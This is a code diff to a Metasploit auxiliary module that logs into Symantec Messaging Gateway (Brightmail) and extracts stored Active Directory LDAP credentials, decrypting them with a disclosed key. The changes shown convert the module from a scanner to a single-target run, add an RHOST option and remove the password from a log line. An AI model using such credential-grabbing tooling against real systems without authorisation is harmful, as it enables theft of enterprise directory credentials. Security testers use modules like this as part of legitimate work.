@@ -11,15 +11,14 @@ require "openssl"
 
 class Metasploit3 < Msf::Auxiliary
 
-  include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Symantec Messaging Gateway 10 LDAP Creds Graber',
+      'Name'           => 'Symantec Messaging Gateway (brightmail)  10 LDAP Creds Graber',
       'Description'    => %q{
-          This module will  grab the AD account saved in Symantec Messaging Gateway and then decipher it using the disclosed symantec pbe key.  Note that authentication is required in order to successfully grab the LDAP credentials, you need at least a read account.
+          This module will  grab the AD account saved in Symantec Messaging Gateway (brightmail) and then decipher it using the disclosed symantec pbe key.  Note that authentication is required in order to successfully grab the LDAP credentials, you need at least a read account.
       },
       'References'     =>
         [
@@ -44,9 +43,10 @@ class Metasploit3 < Msf::Auxiliary
         OptInt.new('TIMEOUT', [true, 'HTTPS connect/read timeout in seconds', 1]),
         Opt::RPORT(443),
         OptString.new('USERNAME', [true, 'The username to login as']),
+        OptString.new('RHOST', [true, 'The Brightmail Gateway IP Address']),
         OptString.new('PASSWORD', [true, 'The password to login with'])
       ], self.class)
-    deregister_options('RHOST')
+    deregister_options('RHOSTS')
   end
 
   def report_cred(opts)
@@ -237,7 +237,7 @@ class Metasploit3 < Msf::Auxiliary
    end
   end
 
- def run_host(ip)
+ def run
   return unless port_open?
   sid, last_login = get_login_data
   if sid.empty? or last_login.empty?
@@ -251,7 +251,7 @@ class Metasploit3 < Msf::Auxiliary
    print_error("#{peer} - Unable to login.  Cannot continue.")
    return
   else
-   print_good("#{peer} - Logged in as '#{username}:#{password}' Sid: '#{sid}' LastLogin '#{last_login}'")
+   print_good("#{peer} - Logged in as '#{username}' Sid: '#{sid}' LastLogin '#{last_login}'")
   end
   grab_auths(sid,last_login)
   end
